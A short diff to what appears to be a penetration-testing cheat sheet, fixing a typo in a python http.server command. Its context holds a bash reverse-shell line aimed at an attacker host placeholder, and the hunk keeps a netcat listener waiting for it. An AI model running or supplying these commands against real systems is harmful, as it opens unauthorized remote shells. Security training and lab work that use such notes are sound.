@@ -17,7 +17,7 @@ echo "bash -i >& /dev/tcp/<lhost>/<lport> 0>&1" > <revShell>
 
 ### Start listener
 ```
-sudo python3 -m htt.server 80
+python3 -m http.server 80
 nc -lnvp <lport>
 ```
 
